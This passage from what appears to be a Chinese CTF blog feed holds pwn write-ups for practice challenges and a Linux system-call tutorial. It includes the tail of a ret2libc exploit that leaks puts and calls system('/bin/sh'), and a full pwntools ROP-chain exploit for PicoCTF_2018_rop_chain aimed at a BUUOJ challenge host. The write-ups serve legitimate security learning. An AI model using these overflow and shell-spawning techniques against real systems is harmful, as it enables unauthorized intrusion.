string\">b\"story!\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>stroy<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>vuln<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>puts<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">#p.recvuntil(\"help u!\\n\")</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"story!\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>libc<span class=\"token operator\">=</span>LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">,</span>puts<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>libc_base<span class=\"token operator\">=</span>puts<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>system<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>binsh<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"str_bin_sh\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\">#payload2=p32()+p32()+p32()+p32()</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>payload2<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>stroy<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/09/22/pPoUXi8.png\" alt=\"\" /></p>\n<p>【注意】<br />\n远程查找 libc 库无法打通本地（和靶机查找出来的不同）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/22/pPoUoMd.png\" alt=\"\" /></p>\n<p>靶机：<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/22/pPoULIf.png\" alt=\"\" /></p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/10/pwn/%E5%88%B7%E9%A2%98/BUUCTF/PicoCTF_2018_rop_chain1/",
            "url": "https://vvwwvv.cn/2023/09/10/pwn/%E5%88%B7%E9%A2%98/BUUCTF/PicoCTF_2018_rop_chain1/",
            "title": "PicoCTF_2018_rop_chain",
            "date_published": "2023-09-10T13:33:50.279Z",
            "content_html": "<h1 id=\"picoctf_2018_rop_chain\"><a class=\"anchor\" href=\"#picoctf_2018_rop_chain\">#</a> PicoCTF_2018_rop_chain</h1>\n<h2 id=\"1首先查看程序信息\"><a class=\"anchor\" href=\"#1首先查看程序信息\">#</a> 1. 首先查看程序信息</h2>\n<p><img data-src=\"https://ooo.0x0.ooo/2023/09/10/OnKFxK.png\" alt=\"\" /></p>\n<p>发现是 32 位程序，开启了 NX</p>\n<p><strong>利用 ida 查看</strong></p>\n<p>首先查看 main 函数</p>\n<p><img data-src=\"https://ooo.0x0.ooo/2023/09/10/OnKhJa.png\" alt=\"\" /></p>\n<p>里面有个 vuln 函数，查看</p>\n<p><img data-src=\"https://ooo.0x0.ooo/2023/09/10/OnKifS.png\" alt=\"\" /></p>\n<p>发现 ret 到 gets 函数，由溢出可以利用</p>\n<p>发现有其他函数</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/10/pPcTy6S.png\" alt=\"\" /></p>\n<p>逐个查看</p>\n<p>win_function1</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/10/pPcT2wj.png\" alt=\"\" /></p>\n<p>win_function2</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/10/pPcTfkn.png\" alt=\"\" /></p>\n<p>flag</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/10/pPcThYq.png\" alt=\"\" /></p>\n<h2 id=\"2分析\"><a class=\"anchor\" href=\"#2分析\">#</a> 2. 分析</h2>\n<p>1. 由上面的函数可以看出，下面的成立时可以输出 flag</p>\n<p><code>if ( win1 &amp;&amp; win2 &amp;&amp; a1 == -559039827 )</code></p>\n<p>但是程序并没有调用这些函数，需要我们自己去执行，通过上面发现的溢出漏洞可以做到</p>\n<p>2. 在 function1 中 <strong>win1=1</strong> ，而 function2 中:</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> win1 <span class=\"token operator\">&amp;&amp;</span> a1 <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1163220307</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    win2 <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>需要让 <strong>a1=-1163220307（0xBAAAAAAD）</strong> 才能实现 win2=1，并且在 flag 中要让   <strong>a1=-559039827（0xDEADBAAD）</strong>  才能获取 flag</p>\n<p>注意 <strong>a1 是作为参数传入的</strong> ，而 32 位系统是用栈来传参（栈中先是返回地址然后是参数的顺序），所以就可以通过溢出来控制参数的值</p>\n<h2 id=\"3exp\"><a class=\"anchor\" href=\"#3exp\">#</a> 3.exp:</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29168</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./2018_rop\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>function1<span class=\"token operator\">=</span><span class=\"token number\">0x80485CB</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>function2<span class=\"token operator\">=</span><span class=\"token number\">0x80485D8</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token number\">0x804862B</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>vuln<span class=\"token operator\">=</span><span class=\"token number\">0x8048714</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>a1_function2<span class=\"token operator\">=</span><span class=\"token number\">0xBAAAAAAD</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>a1_flag<span class=\"token operator\">=</span><span class=\"token number\">0xDEADBAAD</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Enter your input> \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>function1<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>function2<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>a1_function2<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>a1_flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://s1.ax1x.com/2023/09/10/pPcb9dH.png\" alt=\"\" /></p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/08/29/Linux/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/",
            "url": "https://vvwwvv.cn/2023/08/29/Linux/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/",
            "title": "Linux之系统调用",
            "date_published": "2023-08-29T12:15:56.000Z",
            "content_html": "<h1 id=\"一系统调用\"><a class=\"anchor\" href=\"#一系统调用\">#</a> 一。系统调用</h1>\n<p>系统调用也是一个函数，但是系统调用运行在内核态，用户自定义的函数在用户态。而我们想要调用在内核态的指令（如关闭 / 打开中断，I/O 操作等），就需要利用系统调用作为接口，让用户进入内核态。</p>\n<p>系统调用是 Linux 内核提供的一段代码（也可以理解为函数）用来实现特定的功能，**32 位程序（x86 CPU）利用 int 0x80 ** 来进行系统调用，<strong>64 位程序 (X64 CPU) 提供调用 syscall</strong> 来进行系统调用。Linux 内核提供用户空间程序与内核空间进行交互的接口（接口让用户态程序能受限访问硬件设备，比如申请系统资源，操作设备读写，创建新进程等），用户空间发起请求，内核空间负责进行执行，两者之间就需要接口作为桥梁，用户可以通过这种方式来进行系统调用，但是用户是受到限制的，不能直接执行内核代码，也不能随意进行修改系统，必须通过特定方式才能进行才能进入内核，也需要一定的权限才能使用接口。</p>\n<p>上述提到的用户空间与内核空间之间的桥梁就是系统调用 (syscall,system call), 其作为中间层用来连接用户态和内核态，这样做加强了一定的安全性，并且我们不需要关系内核是如和完成指令的直接调用需要的接口即可。当用户空间向系统空间发起系统调用时，Linux 系统便会进行软中断，进入内核态执行相应的操作。</p>\n<p>不同的系统调用执行的命令有着不同的系统调用号（32 位程序与 64 位程序也不尽相同）</p>\n<h1 id=\"二32位程序系统调用\"><a class=\"anchor\" href=\"#二32位程序系统调用\">#</a> 二.<strong>32 位程序</strong>系统调用</h1>\n<h2 id=\"1在32位系统x86-cpu中-linux通过了-int-0x80-中断来进入系统调用\"><a class=\"anchor\" href=\"#1在32位系统x86-cpu中-linux通过了-int-0x80-中断来进入系统调用\">#</a> 1. 在 32 位系统（x86 CPU）中，Linux 通过了 int 0x80 中断来进入系统调用，</h2>\n<pre><code class=\"language-C\">void system_call()\n&#123;\n    ...\n    // 变量 eax 代表 eax 寄存器的值\n    syscall = sys_call_table[eax];\n    eax = syscall();\n    ...\n&#125;\n</code></pre>\n<p>sys_call_table 变量是一个数组（eax 寄存器的值作为其下标），数组的每一个元素代表着一个系统调用的入口（这让我想起了操作系统实验 x_x）, 其 C 代码如下</p>\n<pre><code class=\"language-C\">long sys_call_table[] = &#123;\n   sys_ni_syscall,\n   sys_exit,\n   sys_fork,\n   sys_read,\n   sys_write,\n   sys_open,\n   sys_close,\n   ...\n&#125;;\n</code></pre>\n<h2 id=\"用户调用系统调用时通过向eax寄存器写入对应命令的系统调用号这个号就是sys_call_table数组的下标system_call过程获取eax寄存器的值然后通过eax寄存器的值找到要调用的系统入口并调用系统调用完成后会把返回值保存到eax寄存器中\"><a class=\"anchor\" href=\"#用户调用系统调用时通过向eax寄存器写入对应命令的系统调用号这个号就是sys_call_table数组的下标system_call过程获取eax寄存器的值然后通过eax寄存器的值找到要调用的系统入口并调用系统调用完成后会把返回值保存到eax寄存器中\">#</a> 用户调用<strong>系统调用</strong>时，通过向 eax 寄存器写入对应命令的系统调用号，这个号就是 sys_call_table 数组的下标，system_call 过程获取 eax 寄存器的值，然后通过 eax 寄存器的值找到要调用的系统入口并调用，系统调用完成后会把<strong>返回值保存到 eax 寄存器中</strong></h2>\n<h2 id=\"用户进行系统调用时在eax寄存器写入对应的系统调用编号而用户态和内核态使用的栈不同系统调用是用户态调用然后进入系统调用后会转变成内核态要经历用户态与内核态的转化所以不能直接使用用户空间的栈来传递参数32位系统用户态内利用栈来传参64位仍然需要寄存器来传参-linux-使用寄存器来传递参数其顺序如下\"><a class=\"anchor\" href=\"#用户进行系统调用时在eax寄存器写入对应的系统调用编号而用户态和内核态使用的栈不同系统调用是用户态调用然后进入系统调用后会转变成内核态要经历用户态与内核态的转化所以不能直接使用用户空间的栈来传递参数32位系统用户态内利用栈来传参64位仍然需要寄存器来传参-linux-使用寄存器来传递参数其顺序如下\">#</a> 用户进行系统调用时，在 eax 寄存器写入对应的系统调用编号，而用户态和内核态使用的栈不同，系统调用是用户态调用然后进入系统调用后会转变成内核态，要经历用户态与内核态的转化，所以不能直接使用用户空间的栈来传递参数（32 位系统用户态内利用栈来传参，64 位仍然需要寄存器来传参）。Linux 使用寄存器来传递参数，其顺序如下：</h2>\n<ul>\n<li>第 1 个参数放置在 ebx  寄存器。</li>\n<li>第 2 个参数放置在 ecx  寄存器。</li>\n<li>第 3 个参数放置在 edx  寄存器。</li>\n<li>第 4 个参数放置在 esi   寄存器。</li>\n<li>第 5 个参数放置在 edi   寄存器。</li>\n<li>第 6 个参数放置在 ebp 寄存器。</li>\n</ul>\n<h2 id=\"linux进入中断处理时就会将这些寄存器的值保存到内核栈中这样系统调用就能通过内核栈来获取参数\"><a class=\"anchor\" href=\"#linux进入中断处理时就会将这些寄存器的值保存到内核栈中这样系统调用就能通过内核栈来获取参数\">#</a> Linux 进入中断处理时，就会将这些寄存器的值保存到内核栈中，这样系统调用就能通过内核栈来获取参数。</h2>\n<p>x86 架构系统调用漏洞利用参考: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjQ4NjgyLmh0bQ==\">https://bbs.kanxue.com/thread-248682.htm</span></p>\n<p>参考文章: <span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9jcklycg==\">Linux 下 syscall 系统调用原理及实现</span></p>\n<h1 id=\"三64位系统系统调用\"><a class=\"anchor\" href=\"#三64位系统系统调用\">#</a> 三.<strong>64 位系统</strong>系统调用</h1>\n<h2 id=\"164位x64架构系统中linux通过syscall指令来进入系统调用其他原理与x86架构相似这里偷懒不再解释不过64位系统与32位系统寄存器不同这里传参的寄存器也不一样\"><a class=\"anchor\" href=\"#164位x64架构系统中linux通过syscall指令来进入系统调用其他原理与x86架构相似这里偷懒不再解释不过64位系统与32位系统寄存器不同这里传参的寄存器也不一样\">#</a> 1.64 位（x64 架构）系统中，Linux 通过<strong> syscall 指令</strong>来进入系统调用，其他原理与 x86 架构相似，这里偷懒不再解释，不过 64 位系统与 32 位系统寄存器不同，这里传参的寄存器也不一样</h2>\n<h2 id=\"传参方式-将系统调用号存入rax寄存器中然后从左到右依次将参数传入rdi-rsi-rdx寄存器中\"><a class=\"anchor\" href=\"#传参方式-将系统调用号存入rax寄存器中然后从左到右依次将参数传入rdi-rsi-rdx寄存器中\">#</a> 传参方式：将系统调用号存入 rax 寄存器中，然后从左到右依次将参数传入<strong> rdi、rsi、rdx 寄存器</strong>中：</h2>\n<ul>\n<li>第 1 个参数放置在 rdi  寄存器。</li>\n<li>第 2 个参数放置在 rsi  寄存器。</li>\n<li>第 3 个参数放置在 rdx  寄存器。</li>\n<li>第 4 个参数放置在 rcx  寄存器。</li>\n<li>第 5 个参数放置在 r8  寄存器。</li>\n<li>第 6 个参数放置在 r9  寄存器。</li>\n</ul>\n<h2 id=\"系统调用完成后把返回值保存到rax寄存器中\"><a class=\"anchor\" href=\"#系统调用完成后把返回值保存到rax寄存器中\">#</a> 系统调用完成后，把<strong>返回值保存到 rax 寄存器中</strong></h2>\n<h1 id=\"四32位系统与64位系统-对比系统调用不同\"><a class=\"anchor\" href=\"#四32位系统与64位系统-对比系统调用不同\">#</a> 四.32 位系统与 64 位系统 <strong>对比系统调用不同</strong></h1>\n<h2 id=\"1系统调用号不同\"><a class=\"anchor\" href=\"#1系统调用号不同\">#</a> 1. 系统调用号不同</h2>\n<h3 id=\"32位\"><a class=\"anchor\" href=\"#32位\">#</a> 32 位</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#ifndef _ASM_X86_UNISTD_32_H</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#define _ASM_X86_UNISTD_32_H 1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#define __NR_restart_syscall 0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#define __NR_exit 1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#define __NR_fork 2</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#define __NR_read 3</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#define __NR_write 4</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#define __NR_open 5</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#define __NR_close 6</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#define __NR_waitpid 7</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#define __NR_creat 8</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">#define __NR_link 9</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#define __NR_unlink 10</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">#define __NR_execve 11</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">#define __NR_chdir 12</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">#define __NR_time 13</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">#define __NR_mknod 14</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#define __NR_chmod 15</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">#define __NR_lchown 16</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">#define __NR_break 17</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">#define __NR_oldstat 18</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#define __NR_lseek 19</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">#define __NR_getpid 20</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\">#define __NR_mount 21</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\">#define __NR_umount 22</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">#define __NR_setuid 23</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">#define __NR_getuid 24</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">#define __NR_stime 25</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">#define __NR_ptrace 26</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">#define __NR_alarm 27</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\">#define __NR_oldfstat 28</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\">#define __NR_pause 29</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">#define __NR_utime 30</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\">#define __NR_stty 31</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\">#define __NR_gtty 32</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\">#define __NR_access 33</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token comment\">#define __NR_nice 34</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\">#define __NR_ftime 35</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\">#define __NR_sync 36</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token comment\">#define __NR_kill 37</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\">#define __NR_rename 38</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token comment\">#define __NR_mkdir 39</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token comment\">#define __NR_rmdir 40</span></pre></td></tr></table></figure><h3 id=\"64位系统\"><a class=\"anchor\" href=\"#64位系统\">#</a> 64 位系统</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#ifndef _ASM_X86_UNISTD_64_H</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#define _ASM_X86_UNISTD_64_H 1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#define __NR_read 0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#define __NR_write 1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#define __NR_open 2</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#define __NR_close 3</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#define __NR_stat 4</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#define __NR_fstat 5</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#define __NR_lstat 6</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#define __NR_poll 7</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#define __NR_lseek 8</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">#define __NR_mmap 9</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#define __NR_mprotect 10</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">#define __NR_munmap 11</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">#define __NR_brk 12</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">#define __NR_rt_sigaction 13</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">#define __NR_rt_sigprocmask 14</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#define __NR_rt_sigreturn 15</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">#define __NR_ioctl 16</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">#define __NR_pread64 17</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">#define __NR_pwrite64 18</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#define __NR_readv 19</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">#define __NR_writev 20</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\">#define __NR_access 21</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\">#define __NR_pipe 22</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">#define __NR_select 23</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">#define __NR_sched_yield 24</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">#define __NR_mremap 25</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">#define __NR_msync 26</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">#define __NR_mincore 27</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\">#define __NR_madvise 28</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\">#define __NR_shmget 29</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">#define __NR_shmat 30</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\">#define __NR_shmctl 31</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\">#define __NR_dup 32</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\">#define __NR_dup2 33</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token comment\">#define __NR_pause 34</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\">#define __NR_nanosleep 35</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\">#define __NR_getitimer 36</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token comment\">#define __NR_alarm 37</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\">#define __NR_setitimer 38</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token comment\">#define __NR_getpid 39</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token comment\">#define __NR_sendfile 40</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\">#define __NR_socket 41</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token comment\">#define __NR_connect 42</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token comment\">#define __NR_accept 43</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token comment\">#define __NR_sendto 44</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token comment\">#define __NR_recvfrom 45</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token comment\">#define __NR_sendmsg 46</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\">#define __NR_recvmsg 